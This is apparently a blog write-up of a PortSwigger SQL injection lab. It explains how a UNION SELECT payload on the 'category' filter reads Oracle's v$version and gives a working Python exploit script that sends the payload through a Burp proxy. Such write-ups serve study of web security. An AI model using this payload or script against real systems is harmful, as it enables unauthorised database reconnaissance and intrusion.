@@ -1,0 +1,70 @@
+---
+title: 'SQLi Lab 3'
+description: 'Using SQL Injection to determine Oracle database details via v$version'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## SQL injection attack, querying the database type and version on Oracle
+
+<div style="text-align: justify;">
+  In this lab, I learned how SQL injection can be leveraged not just for login bypass or data leaks, but for critical recon such as identifying the target database type and version. Using a UNION SELECT injection on an Oracle backend, I was able to extract data from the `v$version` view. Knowing the exact DBMS and version is valuable during real-world exploitation, as it informs which payloads and techniques are likely to succeed.
+
+  The vulnerable parameter was found in the `category` filter, which accepted user input unsafely. Crafting a payload to select from `v$version` revealed the Oracle database version, confirming the injection point and enabling further targeted testing.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- The input in the `category` parameter is injectable.
+- A **UNION SELECT** statement is used to retrieve DB banner/version.
+- Oracle's `v$version` view is targeted to reveal backend info.
+- Script looks for a success message (e.g., "Congratulations") in the response.
+- This indicates that the injected query was executed and returned data.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import requests
+import sys
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def exploit_sqli(url, payload):
+    uri = '/filter?category='
+    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
+    if "Congratulations" in r.text:
+        return True
+    else:
+        return False
+
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+        payload = "'UNION+SELECT+BANNER,BANNER+FROM+v$version--"
+    except IndexError:
+        print("[-] Usage: %s <url>" %sys.argv[0])
+        print('[-] Example: %s www.example.com ' % sys.argv[0])
+        sys.exit(-1)
+        
+    if exploit_sqli(url, payload):
+        print("[+] SQL injection successful!")
+    else:
+        print("[-] SQL injection unsuccessful")        
+```
+
+import { Comment } from 'astro-pure/advanced'
+
+<Comment />
